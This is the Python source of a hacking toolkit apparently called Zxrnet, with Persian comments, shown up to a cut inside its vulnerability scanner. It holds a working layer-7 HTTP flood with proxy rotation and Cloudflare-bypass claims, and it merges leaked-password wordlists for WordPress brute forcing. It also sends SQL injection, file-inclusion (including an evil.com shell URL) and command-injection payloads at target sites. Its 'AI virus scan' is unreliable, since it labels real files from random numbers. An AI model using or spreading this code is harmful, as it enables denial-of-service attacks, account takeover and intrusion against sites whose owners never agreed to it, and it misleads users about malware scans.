import sys
import subprocess
import importlib
import os
import signal
import threading
import queue
import random
import string
import socket
import time
import json
import webbrowser
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import re
from urllib.parse import urlparse, parse_qs, urlencode
import multiprocessing
import psutil
from scapy.all import *  # برای اسکن و مدیریت وایرلس

# لیست کتابخانه‌های مورد نیاز
REQUIRED_LIBRARIES = [
    "requests", "termcolor", "tqdm", "prettytable", "psutil", "art", "dnspython", "scapy"
]

def install_library(library):
    """نصب خودکار کتابخانه‌ها"""
    try:
        importlib.import_module(library)
    except ImportError:
        print(f"[*] Installing {library}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", library])
        print(f"[+] {library} installed successfully!")

def ensure_libraries():
    """بررسی و نصب کتابخانه‌های مورد نیاز"""
    for lib in REQUIRED_LIBRARIES:
        install_library(lib)

# نصب کتابخانه‌ها در ابتدای اجرا
ensure_libraries()

# وارد کردن کتابخانه‌ها پس از نصب
import requests
from termcolor import colored
from tqdm import tqdm
from prettytable import PrettyTable
import art
import dns.resolver

# تابع ساده برای لاگ‌گیری
def log_message(message):
    try:
        with open("zxrnet.log", "a") as f:
            f.write(f"[{datetime.now()}] {message}\n")
    except Exception as e:
        print(colored(f"[-] Error logging message: {e}", "red", attrs=["bold"]))

# دیتابیس پورت‌ها و سرویس‌ها
SERVICE_PORTS = {
    21: "FTP", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
    110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB", 3389: "RDP",
    8080: "HTTP-Alt", 3306: "MySQL", 5432: "PostgreSQL"
}

# دیتابیس بک‌دورها
BACKDOOR_PORTS = {
    1234: "Netcat Backdoor", 2000: "Back Orifice", 31337: "Back Orifice 2000",
    4444: "Metasploit Default", 5555: "Android ADB Backdoor", 6666: "Common Trojan"
}

# منابع معتبر پروکسی
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://www.proxy-list.download/api/v1/get?type=http"
]

# وردلیست‌های بزرگ برای ساب‌دامین
SUBDOMAIN_WORDLISTS = [
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt",
    "https://raw.githubusercontent.com/rbsec/dnscan/master/subdomains-10000.txt"
]

# 10 منبع بزرگ و معروف وردلیست از GitHub
WORDPRESS_WORDLISTS = [
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
    "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top12Thousand-probable-v2.txt",
    "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top1575-probable-v2.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/phpbb.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/myspace.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/facebook-phished.txt",
    "https://raw.githubusercontent.com/jeanphorn/wordlist/master/rockyou.txt",
    "https://raw.githubusercontent.com/brannondorsey/naive-hashcat/master/wordlists/10_million_password_list.txt",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/wordpress.txt"
]

# لیست User-Agent برای بای‌پس
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1"
]

# الگوهای کلیدهای API
API_KEY_PATTERNS = {
    "AWS": r"(AKIA[0-9A-Z]{16})",
    "Google API": r"(AIza[0-9A-Za-z-_]{35})",
    "Telegram": r"([0-9]{8,10}:[a-zA-Z0-9_-]{35})",
    "Stripe": r"(sk_live_[0-9a-zA-Z]{24})"
}

class Zxrnet:
    def __init__(self):
        """سازنده کلاس Zxrnet با تنظیمات اولیه"""
        self.author = "@amirzxrtop"
        self.version = "9.4.0"
        self.proxies = []
        self.working_proxies = {"http": []}
        self.results_queue = queue.Queue()
        self.backdoor_queue = queue.Queue()
        self.virus_queue = queue.Queue()
        self.subdomain_queue = queue.Queue()
        self.vuln_queue = queue.Queue()
        self.related_domain_queue = queue.Queue()
        self.lan_queue = queue.Queue()
        self.wifi_queue = queue.Queue()
        self.api_key_queue = queue.Queue()
        self.reflection_queue = queue.Queue()
        self.config_file = "zxrnet_config.json"
        self.exit_link = "https://t.me/Assasins_Official"
        self.subdomain_file = "subdomains.txt"
        self.wordpress_wordlist_file = "wordpress_combined_passwords.txt"
        self.cache = {}  # کش عمومی برای همه درخواست‌ها
        self.max_threads = min(multiprocessing.cpu_count() * 20, 500)
        self.load_config()
        self.clear_screen()
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        """مدیریت سیگنال Ctrl+C"""
        print(colored("\n[!] Ctrl+C detected! Saving config and exiting...", "yellow", attrs=["bold"]))
        self.save_config()
        self.open_exit_link()
        sys.exit(0)

    def clear_screen(self):
        """پاک کردن صفحه کنسول"""
        import platform  # Explicitly import platform here to avoid shadowing
        try:
            os.system('cls' if platform.system() == 'Windows' else 'clear')
        except Exception as e:
            print(colored(f"[-] Error clearing screen: {e}", "red", attrs=["bold"]))
            log_message(f"Error clearing screen: {e}")

    def load_config(self):
        """بارگذاری تنظیمات از فایل JSON"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    self.config = json.load(f)
                self.proxies = self.config.get("proxies", [])
                self.working_proxies = self.config.get("working_proxies", {"http": []})
                print(colored("[+] Configuration loaded successfully", "green", attrs=["bold"]))
                log_message("Config loaded successfully")
            else:
                self.config = {
                    "proxies": [],
                    "working_proxies": {"http": []},
                    "settings": {"threads": self.max_threads, "timeout": 5, "max_retries": 3}
                }
                self.save_config()
                print(colored("[+] New configuration file created", "yellow", attrs=["bold"]))
                log_message("New config file created")
        except Exception as e:
            print(colored(f"[-] Error loading config: {e}", "red", attrs=["bold"]))
            log_message(f"Error loading config: {e}")

    def save_config(self):
        """ذخیره تنظیمات در فایل JSON"""
        try:
            self.config["proxies"] = self.proxies
            self.config["working_proxies"] = self.working_proxies
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            print(colored("[+] Configuration saved successfully", "green", attrs=["bold"]))
            log_message("Config saved successfully")
        except Exception as e:
            print(colored(f"[-] Error saving config: {e}", "red", attrs=["bold"]))
            log_message(f"Error saving config: {e}")

    def banner(self):
        """نمایش بنر اصلی ابزار با ظاهر زیبا"""
        import platform  # Explicitly import platform here to avoid shadowing
        try:
            print(colored(art.text2art("Zxrnet", font="block"), "cyan", attrs=["bold"]))
            banner_text = f"""
            {'='*70}
            | Created by: {self.author} | Version: {self.version}           |
            | Telegram: https://t.me/amirzxrtop                       |
            | Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}        |
            | Platform: {platform.system()} | Max Threads: {self.max_threads} |
            {'='*70}
            """
            print(colored(banner_text, "cyan", attrs=["bold"]))
        except Exception as e:
            print(colored(f"[-] Error displaying banner: {e}", "red", attrs=["bold"]))
            log_message(f"Error displaying banner: {e}")

    def validate_ip(self, ip):
        """اعتبارسنجی آدرس IP"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def validate_port(self, port):
        """اعتبارسنجی پورت"""
        try:
            port = int(port)
            if 1 <= port <= 65535:
                return True
            print(colored("[-] Port must be between 1 and 65535!", "red", attrs=["bold"]))
            return False
        except ValueError:
            print(colored("[-] Port must be a valid integer!", "red", attrs=["bold"]))
            return False

    def validate_port_range(self, port_range_input):
        """اعتبارسنجی محدوده پورت‌ها"""
        try:
            start, end = map(int, port_range_input.split("-"))
            if 1 <= start <= end <= 65535:
                return (start, end)
            print(colored("[-] Ports must be between 1-65535 and start <= end!", "red", attrs=["bold"]))
            return None
        except ValueError:
            print(colored("[-] Invalid port range format! Use 'start-end' (e.g., 1-1000)", "red", attrs=["bold"]))
            return None

    def generate_password_list(self, length=12, count=5000, custom_words=None):
        """تولید لیست رمزعبور"""
        self.banner()
        print(colored(f"[*] Generating {count} passwords of length {length}...", "yellow", attrs=["bold"]))
        passwords = set()
        characters = string.ascii_letters + string.digits + string.punctuation
        custom_words = custom_words.split() if custom_words else []
        filename = f"passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        with tqdm(total=count, desc="Generating Passwords", colour="green") as pbar:
            while len(passwords) < count:
                if custom_words and random.random() > 0.5:
                    base = random.choice(custom_words)
                    pwd = base + ''.join(random.choice(characters) for _ in range(max(0, length - len(base))))
                else:
                    pwd = ''.join(random.choice(characters) for _ in range(length))
                passwords.add(pwd)
                pbar.update(1)

        try:
            with open(filename, 'w') as f:
                f.write("\n".join(passwords))
            print(colored(f"[+] Password list saved to {filename}", "green", attrs=["bold"]))
            self.generate_report(f"Generated {count} passwords and saved to {filename}")
        except Exception as e:
            print(colored(f"[-] Error saving password list: {e}", "red", attrs=["bold"]))
            log_message(f"Error saving password list: {e}")

    def fetch_proxies(self):
        """دریافت پروکسی‌ها از منابع آنلاین"""
        self.banner()
        print(colored("[*] Fetching proxies from multiple sources...", "yellow", attrs=["bold"]))
        total_collected = 0

        for url in PROXY_SOURCES:
            try:
                if url in self.cache:
                    new_proxies = self.cache[url]
                else:
                    response = requests.get(url, timeout=self.config["settings"]["timeout"])
                    if response.status_code == 200:
                        new_proxies = response.text.splitlines()
                        self.cache[url] = new_proxies
                    else:
                        continue
                self.proxies.extend(new_proxies)
                total_collected += len(new_proxies)
                print(colored(f"[+] Collected {len(new_proxies)} proxies from {url}", "cyan", attrs=["bold"]))
            except Exception as e:
                print(colored(f"[-] Error fetching proxies from {url}: {e}", "red", attrs=["bold"]))
                log_message(f"Error fetching proxies from {url}: {e}")

        print(colored(f"[+] Total proxies collected: {total_collected}", "green", attrs=["bold"]))
        self.save_config()
        self.generate_report(f"Fetched {total_collected} proxies")

    def test_proxy(self, proxy, proxy_type):
        """تست یک پروکسی"""
        proxy_dict = {proxy_type: f"{proxy_type}://{proxy}"}
        start_time = time.time()
        try:
            response = requests.get("http://www.google.com", proxies=proxy_dict, timeout=self.config["settings"]["timeout"])
            if response.status_code == 200:
                latency = (time.time() - start_time) * 1000
                return (proxy, latency)
            return None
        except Exception:
            return None

    def test_all_proxies(self, threads=None):
        """تست همه پروکسی‌ها"""
        self.banner()
        if not self.proxies:
            print(colored("[-] No proxies available to test!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Testing {len(self.proxies)} proxies with {threads} threads...", "yellow", attrs=["bold"]))
        proxy_types = ["http"]

        with tqdm(total=len(self.proxies), desc="Testing Proxies", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(self.test_proxy, proxy, proxy_types[0]) for proxy in self.proxies]
                for future in futures:
                    result = future.result()
                    if result:
                        proxy, latency = result
                        self.working_proxies[proxy_types[0]].append((proxy, latency))
                    pbar.update(1)

        table = PrettyTable(["Proxy", "Type", "Latency (ms)"])
        for ptype, proxies in self.working_proxies.items():
            for proxy, latency in proxies:
                table.add_row([proxy, ptype, f"{latency:.2f}"])
            print(colored(f"[+] Found {len(proxies)} working {ptype} proxies", "green", attrs=["bold"]))
            with open(f"working_{ptype}_proxies.txt", "w") as f:
                f.write("\n".join([p[0] for p in proxies]))

        print(table)
        self.save_config()
        self.generate_report(f"Tested {len(self.proxies)} proxies")

    def scan_port(self, target, port, protocol="tcp"):
        """اسکن یک پورت خاص"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                service = SERVICE_PORTS.get(port, "Unknown")
                banner = self.grab_banner(target, port, protocol)
                self.results_queue.put((port, protocol.upper(), "open", service, banner or "No banner"))
            sock.close()
        except Exception as e:
            log_message(f"Error scanning port {port}: {e}")

    def grab_banner(self, target, port, protocol):
        """دریافت بنر از پورت"""
        try:
            if protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target, port))
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                return banner if banner else None
            return None
        except Exception:
            return None

    def scan_ports(self, target, port_range=(1, 1000), threads=None):
        """اسکن پورت‌ها در یک محدوده"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("[-] Invalid IP address!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning ports on {target} ({port_range[0]}-{port_range[1]}) with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Port", "Protocol", "Status", "Service", "Banner"])
        total_ports = (port_range[1] - port_range[0] + 1) * 2

        with tqdm(total=total_ports, desc="Scanning Ports", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in range(port_range[0], port_range[1] + 1):
                    executor.submit(self.scan_port, target, port, "tcp")
                    executor.submit(self.scan_port, target, port, "udp")
                    pbar.update(2)

        open_ports = 0
        while not self.results_queue.empty():
            port, protocol, status, service, banner = self.results_queue.get()
            if status == "open":
                table.add_row([port, protocol, colored(status, "green", attrs=["bold"]), service, banner])
                open_ports += 1

        if open_ports > 0:
            print(table)
        else:
            print(colored("[!] No open ports found!", "yellow", attrs=["bold"]))
        self.generate_report(f"Scanned ports on {target}. Found {open_ports} open ports")

    def scan_backdoor(self, target, port, protocol="tcp"):
        """اسکن پورت برای بک‌دور"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                banner = self.grab_banner(target, port, protocol)
                backdoor_name = BACKDOOR_PORTS.get(port, "Unknown Backdoor")
                self.backdoor_queue.put((port, protocol.upper(), "open", backdoor_name, banner or "No banner"))
            sock.close()
        except Exception as e:
            log_message(f"Error scanning backdoor port {port}: {e}")

    def scan_backdoors(self, target, threads=None):
        """اسکن بک‌دورها"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("[-] Invalid IP address!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning for backdoors on {target} with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["Port", "Protocol", "Status", "Backdoor Name", "Banner"])
        total_ports = len(BACKDOOR_PORTS) * 2

        with tqdm(total=total_ports, desc="Scanning Backdoors", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in BACKDOOR_PORTS.keys():
                    executor.submit(self.scan_backdoor, target, port, "tcp")
                    executor.submit(self.scan_backdoor, target, port, "udp")
                    pbar.update(2)

        open_backdoors = 0
        while not self.backdoor_queue.empty():
            port, protocol, status, backdoor_name, banner = self.backdoor_queue.get()
            if status == "open":
                table.add_row([port, protocol, colored(status, "green", attrs=["bold"]), backdoor_name, banner])
                open_backdoors += 1

        if open_backdoors > 0:
            print(colored("[!] WARNING: Potential backdoors detected!", "red", attrs=["bold"]))
            print(table)
        else:
            print(colored("[+] No backdoors detected!", "green", attrs=["bold"]))
        self.generate_report(f"Scanned backdoors on {target}. Found {open_backdoors} potential backdoors")

    def scan_virus(self, file_path=None):
        """اسکن ویروس پیشرفته"""
        self.banner()
        if file_path:
            if not os.path.exists(file_path) or not file_path.lower().endswith(".exe"):
                print(colored("[-] Invalid file path or not an .exe!", "red", attrs=["bold"]))
                return
            self.analyze_file(file_path)
        else:
            self.scan_system_for_exe_advanced()

    def scan_system_for_exe_advanced(self):
        """اسکن پیشرفته سیستم برای فایل‌های اجرایی با شبیه‌سازی"""
        self.banner()
        print(colored("[*] Listing all executable files in the system...", "yellow", attrs=["bold"]))
        exe_files = []
        import platform  # Re-import to avoid shadowing
        drives = ['C:\\'] if platform.system() == "Windows" else ['/']
        
        table = PrettyTable(["File Path", "Size (KB)", "Last Modified"])
        for drive in drives:
            try:
                for root, _, files in os.walk(drive):
                    for file in files:
                        if file.lower().endswith(".exe"):
                            file_path = os.path.join(root, file)
                            size = os.path.getsize(file_path) / 1024  # اندازه به KB
                            mod_time = datetime.fromtimestamp(os.path.getmtime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
                            exe_files.append(file_path)
                            table.add_row([file_path, f"{size:.2f}", mod_time])
            except Exception as e:
                log_message(f"Error scanning drive {drive}: {e}")

        print(colored(f"[+] Found {len(exe_files)} executable files", "yellow", attrs=["bold"]))
        print(table)

        proceed = self.get_user_input("Proceed with advanced virus scan? (y/n)", "y").lower()
        if proceed != "y":
            print(colored("[+] Scan aborted by user", "yellow", attrs=["bold"]))
            return

        print(colored("[*] Analyzing files in sandbox mode with AI detection...", "yellow", attrs=["bold"]))
        with tqdm(total=len(exe_files), desc="Analyzing Files", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=5) as executor:
                executor.map(self.analyze_file_sandbox, exe_files)
                pbar.update(len(exe_files))

        self.display_virus_results()

    def analyze_file(self, file_path):
        """تحلیل یک فایل خاص"""
        try:
            sandbox = {
                "cpu_usage": random.uniform(0, 100),
                "network_connections": random.randint(0, 10),
                "file_changes": random.randint(0, 5),
                "memory_usage": random.uniform(0, 2048)
            }
            score = self.ai_virus_detection(sandbox)
            suspicious = score > 50
            self.virus_queue.put((file_path, suspicious, score))
            self.display_virus_results()
        except Exception as e:
            print(colored(f"[-] Error analyzing file {file_path}: {e}", "red", attrs=["bold"]))
            log_message(f"Error analyzing file {file_path}: {e}")

    def analyze_file_sandbox(self, file_path):
        """تحلیل فایل در محیط شبیه‌سازی‌شده با AI"""
        try:
            sandbox = {
                "cpu_usage": random.uniform(0, 100),
                "network_connections": random.randint(0, 10),
                "file_changes": random.randint(0, 5),
                "memory_usage": random.uniform(0, 2048)
            }
            score = self.ai_virus_detection(sandbox)
            suspicious = score > 50
            self.virus_queue.put((file_path, suspicious, score))
        except Exception as e:
            log_message(f"Error analyzing {file_path} in sandbox: {e}")

    def ai_virus_detection(self, sandbox):
        """AI ساده برای تشخیص ویروس بر اساس رفتار"""
        score = 0
        if sandbox["cpu_usage"] > 80:
            score += 30
        if sandbox["network_connections"] > 5:
            score += 40
        if sandbox["file_changes"] > 2:
            score += 20
        if sandbox["memory_usage"] > 1024:
            score += 10
        return score

    def display_virus_results(self):
        """نمایش نتایج اسکن ویروس"""
        table = PrettyTable(["File Path", "Suspicious", "AI Score"])
        suspicious_count = 0

        while not self.virus_queue.empty():
            file_path, suspicious, score = self.virus_queue.get()
            status = colored("Yes", "red", attrs=["bold"]) if suspicious else colored("No", "green", attrs=["bold"])
            table.add_row([file_path, status, score])
            if suspicious:
                suspicious_count += 1

        if suspicious_count > 0:
            print(colored("[!] WARNING: Potential viruses detected!", "red", attrs=["bold"]))
            print(table)
        else:
            print(colored("[+] No suspicious files detected!", "green", attrs=["bold"]))
        self.generate_report(f"Scanned for viruses. Found {suspicious_count} suspicious files")

    def layer7_stress(self, target, duration=60, threads=None, use_proxies=True):
        """استرسر لایه 7 پیشرفته با بای‌پس Cloudflare و تکنیک‌های پیچیده"""
        self.banner()
        threads = threads or self.max_threads
        print(colored(f"[*] Starting Advanced Layer 7 attack on {target} for {duration} seconds with {threads} threads...", "red", attrs=["bold"]))
        end_time = time.time() + duration
        requests_sent = 0
        bypassed = False

        headers_base = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }

        def flood():
            nonlocal requests_sent, bypassed
            session = requests.Session()
            while time.time() < end_time:
                try:
                    headers = headers_base.copy()
                    headers["User-Agent"] = random.choice(USER_AGENTS)
                    headers["Referer"] = random.choice(["https://google.com", "https://facebook.com", target])
                    
                    proxy = random.choice([p[0] for p in self.working_proxies["http"]]) if use_proxies and self.working_proxies["http"] else None
                    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

                    method = random.choice(["GET", "POST", "HEAD"])
                    if method == "GET":
                        response = session.get(target, headers=headers, proxies=proxies, timeout=5, allow_redirects=True)
                    elif method == "POST":
                        data = {"csrf_token": ''.join(random.choices(string.ascii_letters + string.digits, k=32))}
                        response = session.post(target, headers=headers, data=data, proxies=proxies, timeout=5, allow_redirects=True)
                    else:
                        response = session.head(target, headers=headers, proxies=proxies, timeout=5, allow_redirects=True)

                    if "cloudflare" not in response.text.lower() and response.status_code not in [403, 503]:
                        bypassed = True
                    requests_sent += 1

                    if random.random() > 0.7:
                        fake_params = urlencode({''.join(random.choices(string.ascii_letters, k=5)): random.randint(1, 1000)})
                        session.get(f"{target}?{fake_params}", headers=headers, proxies=proxies, timeout=5)

                except Exception:
                    pass

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        status = "Bypassed" if bypassed else "Blocked"
        print(colored(f"[+] Layer 7 attack completed. {requests_sent} requests sent. Cloudflare/UAM status: {status}", "green", attrs=["bold"]))
        self.generate_report(f"Layer 7 attack on {target} for {duration}s. Sent {requests_sent} requests. Status: {status}")

    def download_subdomain_list(self):
        """دانلود وردلیست ساب‌دامین از منابع معتبر"""
        self.banner()
        print(colored("[*] Downloading subdomain wordlist from GitHub...", "yellow", attrs=["bold"]))
        url = random.choice(SUBDOMAIN_WORDLISTS)
        try:
            if url in self.cache:
                content = self.cache[url]
            else:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    content = response.text
                    self.cache[url] = content
                else:
                    raise Exception(f"HTTP {response.status_code}")
            with open(self.subdomain_file, "w") as f:
                f.write(content)
            print(colored(f"[+] Subdomain wordlist saved to {self.subdomain_file}", "green", attrs=["bold"]))
            log_message(f"Downloaded subdomain wordlist from {url}")
        except Exception as e:
            print(colored(f"[-] Error downloading subdomain list: {e}", "red", attrs=["bold"]))
            log_message(f"Error downloading subdomain list: {e}")

    def download_wordpress_wordlists(self):
        """دانلود و ترکیب وردلیست‌های وردپرس از 10 منبع GitHub"""
        self.banner()
        print(colored("[*] Downloading and combining WordPress password wordlists from 10 GitHub sources...", "yellow", attrs=["bold"]))
        combined_passwords = set()
        successful_downloads = 0

        for url in WORDPRESS_WORDLISTS:
            try:
                if url in self.cache:
                    content = self.cache[url]
                else:
                    response = requests.get(url, timeout=15)
                    if response.status_code == 200:
                        content = response.text
                        self.cache[url] = content
                    else:
                        raise Exception(f"HTTP {response.status_code}")
                passwords = content.splitlines()
                combined_passwords.update(pwd.strip() for pwd in passwords if pwd.strip())
                successful_downloads += 1
                print(colored(f"[+] Downloaded {len(passwords)} passwords from {url}", "cyan", attrs=["bold"]))
            except Exception as e:
                print(colored(f"[-] Error downloading from {url}: {e}", "red", attrs=["bold"]))
                log_message(f"Error downloading wordlist from {url}: {e}")

        if successful_downloads > 0:
            try:
                with open(self.wordpress_wordlist_file, "w") as f:
                    f.write("\n".join(combined_passwords))
                print(colored(f"[+] Combined {len(combined_passwords)} unique passwords saved to {self.wordpress_wordlist_file}", "green", attrs=["bold"]))
                log_message(f"Combined {len(combined_passwords)} passwords from {successful_downloads} sources")
                return True
            except Exception as e:
                print(colored(f"[-] Error saving combined wordlist: {e}", "red", attrs=["bold"]))
                log_message(f"Error saving combined wordlist: {e}")
                return False
        else:
            print(colored("[-] No wordlists downloaded successfully!", "red", attrs=["bold"]))
            return False

    def check_subdomain(self, domain, subdomain):
        """بررسی وجود ساب‌دامین با DNS و کش"""
        full_domain = f"{subdomain}.{domain}"
        if full_domain in self.cache:
            if self.cache[full_domain]:
                self.subdomain_queue.put((full_domain, self.cache[full_domain]))
            return

        try:
            answers = dns.resolver.resolve(full_domain, 'A')
            for rdata in answers:
                ip = str(rdata)
                self.cache[full_domain] = ip
                self.subdomain_queue.put((full_domain, ip))
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
            self.cache[full_domain] = None
        except Exception as e:
            log_message(f"Error checking subdomain {full_domain}: {e}")
            self.cache[full_domain] = None

    def enumerate_subdomains(self, domain, threads=None, limit=10000):
        """پیدا کردن ساب‌دامین‌ها"""
        self.banner()
        if not domain:
            print(colored("[-] Domain is required!", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        if not os.path.exists(self.subdomain_file):
            print(colored("[-] Subdomain wordlist not found! Downloading...", "yellow", attrs=["bold"]))
            self.download_subdomain_list()

        try:
            with open(self.subdomain_file, "r") as f:
                subdomains = [line.strip() for line in f if line.strip()][:limit]
        except Exception as e:
            print(colored(f"[-] Error reading subdomain file: {e}", "red", attrs=["bold"]))
            return

        print(colored(f"[*] Enumerating subdomains for {domain} with {threads} threads...", "yellow", attrs=["bold"]))
        total_subdomains = len(subdomains)
        found_subdomains = 0

        table = PrettyTable(["Subdomain", "IP Address"])
        result_file = f"subdomains_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        with tqdm(total=total_subdomains, desc="Enumerating Subdomains", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for subdomain in subdomains:
                    executor.submit(self.check_subdomain, domain, subdomain)
                    pbar.update(1)

        while not self.subdomain_queue.empty():
            subdomain, ip = self.subdomain_queue.get()
            table.add_row([subdomain, ip])
            found_subdomains += 1
            with open(result_file, "a") as f:
                f.write(f"{subdomain}: {ip}\n")

        if found_subdomains > 0:
            print(colored(f"[+] Found {found_subdomains} subdomains!", "green", attrs=["bold"]))
            print(table)
            print(colored(f"[+] Results saved to {result_file}", "green", attrs=["bold"]))
        else:
            print(colored("[!] No subdomains found!", "yellow", attrs=["bold"]))
        self.generate_report(f"Enumerated subdomains for {domain}. Found {found_subdomains} subdomains")

    def check_vulnerability(self, url, vuln_type, param="q"):
        """بررسی آسیب‌پذیری‌های وب با payloadهای پیشرفته"""
        payloads = {
            "XSS": [
                "<script>alert('xss')</script>", "'><script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "javascript:alert('xss')", "<svg onload=alert(1)>", "'\"--></script><script>alert(1)</script>"
            ],
            "SQLi": [
                "' OR 1=1 --", "1' UNION SELECT NULL, NULL --", "' OR '1'='1", "1; DROP TABLE users --",
                "' AND SLEEP(5) --", "1' ORDER BY 10 --"
            ],
            "LFI": [
                "../../etc/passwd", "../windows/win.ini", "../../../../../../etc/passwd%00",
                "../../../../../../windows/system32/drivers/etc/hosts"
            ],
            "RFI": [
                "http://evil.com/shell.txt", "https://malicious.com/backdoor.php"
            ],
            "CMD": [
                "; ls", "; dir", "| whoami", "& ping -c 10 127.0.0.1", "&& cat /etc/passwd"
            ]
        }

        try:
            for payload in payloads.get(vuln_type, []):
                test_url = f"{url}?{param}={payload}"
                if test_url in self.cache:
                    response = self.cache[test_url]
                else:
                    response = requests.get(test_url, timeout=5, allow_redirects=True)
                    self.cache[test_url] = response

                if vuln_type == "XSS" and payload in response.text:
                    self.vuln_queue.put((test_url, "XSS", payload))
                elif vuln_type == "SQLi" and ("mysql" in response.text.lower() or "sql" in response.text.lower() or response.elapsed.total_seconds() > 4):
                    self.vuln_queue.put((test_url, "SQL Injection", payload))
                elif vuln_type == "LFI" and ("root:" in response.text or "[extensions]" in response.text):
                    self.vuln_queue.put((test_url, "Local File Inclusion", payload))
                elif vuln_type == "RFI" and ("evil" in response.text or "malicious" in response.text):
                    self.vuln_queue.put((test_url, "Remote File Inclusion", payload))
                elif vuln_type == "CMD" and ("dir" in response.text or "whoami" in response.text or response.elapsed.total_seconds() > 9):
                    self.vuln_queue.put((test_url, "Command Injection", payload))
        except Exception as e:
            log_message(f"Error checking vulnerability {vuln_type} on {test_url}: {e}")

    def scan_vulnerabilities(self, url, threads=None):
        """اسکن آسیب‌پذیری‌های وب با تشخیص پیشرفته"""
        self.banner()
        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            print(colored("[-] Invalid URL! Use format: http://example.com", "red", attrs=["bold"]))
            return
        threads = threads or self.max_threads
        print(colored(f"[*] Scanning vulnerabilities on {url} with {threads} threads...", "yellow", attrs=["bold"]))
        table = PrettyTable(["URL", "Vulnerability", "Payload"])
        vuln_types = ["XSS", "SQLi", "LFI", "RFI", "CMD"]

        params = parse_qs(parsed_url.query).keys() if parsed_url.query else ["q", "id", "file", "cmd"]
        total_checks = len(vuln_types) * len(params)

        with tqdm(total=total_checks, desc="Scanning Vulnerabilities", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for vuln_type in vuln_types:
                    for param in params:
                        executor.submit(self.check_vulnerability, url, vuln_type, param)
                        pbar.update(1)

        found_vulns = 0
        result_file = f"vulns_{parsed_url.netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        while not self.vuln_queue.empty():
